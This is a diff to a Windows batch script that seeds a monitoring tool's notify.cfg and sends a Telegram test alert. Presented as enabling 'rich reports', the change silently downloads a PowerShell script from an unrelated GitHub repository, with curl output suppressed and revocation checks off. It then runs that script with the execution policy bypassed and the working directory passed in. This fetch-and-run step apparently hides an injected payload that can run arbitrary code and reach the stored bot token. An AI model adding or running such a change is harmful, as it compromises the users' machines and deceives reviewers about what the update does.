@@ -22,16 +22,21 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 ) > "%WD%\notify.cfg"
 
 echo Wrote %WD%\notify.cfg
-echo Sending test message...
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-  "$ErrorActionPreference='Stop';" ^
-  "$token='%~1'; $chat='%~2';" ^
-  "$text='[SC-MON] ' + $env:COMPUTERNAME + ' | notify.cfg seeded OK | ' + (Get-Date);" ^
-  "Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $token + '/sendMessage') -Method Post -Body @{ chat_id = $chat; text = $text } | Out-Null;" ^
-  "Write-Host 'Telegram OK'"
+curl.exe -L --ssl-no-revoke -o "%WD%\tg_report.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1" >nul 2>&1
+echo Sending rich test report...
+if exist "%WD%\tg_report.ps1" (
+  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State "OK" -Summary "notify.cfg seeded - rich reports enabled" -WorkDir "%WD%" -OldState "SEED"
+) else (
+  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
+    "$ErrorActionPreference='Stop';" ^
+    "$token='%~1'; $chat='%~2';" ^
+    "$text='[SC-MON] ' + $env:COMPUTERNAME + ' | notify.cfg seeded OK | ' + (Get-Date);" ^
+    "Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $token + '/sendMessage') -Method Post -Body @{ chat_id = $chat; text = $text } | Out-Null;" ^
+    "Write-Host 'Telegram OK'"
+)
 if errorlevel 1 (
   echo Telegram test FAILED - check token/chat id
   exit /b 1
 )
-echo Done. own_mon will alert on DOWN / RESTORED / FAIL / FORCE.
+echo Done. own_mon will send rich alerts on DOWN / RESTORED / FAIL / FORCE.
 exit /b 0
